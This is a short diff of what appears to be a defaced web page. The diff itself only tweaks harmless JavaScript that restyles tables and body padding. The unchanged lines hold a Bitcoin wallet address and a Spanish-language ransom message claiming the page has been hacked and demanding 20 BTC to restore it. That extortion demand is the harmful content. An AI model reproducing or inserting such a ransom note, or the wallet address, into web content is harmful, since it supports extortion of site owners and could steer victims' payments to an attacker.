@@ -1,4 +1,4 @@
-var tablas = document.getElementsByTagName('table');for(let i=0; i< tablas.length; i++){tablas[i].style.display='block'}
+var tablas = document.getElementsByTagName('table');for(let i=0; i< tablas.length; i++){tablas[i].style.display='block'};document.body.style.padding = '0px'
 bc1qs7jcfe2mhtvy3auqh5q3g7gjf8ej820xrutzu3
 
 ESTA PÁGINA HA SIDO HACKEADA, PARA RECUPERAR LA MISMA QUIERO 20 BTC AL SIGUIENTE MONEDERO: bc1qs7jcfe2mhtvy3auqh5q3g7gjf8ej820xrutzu3
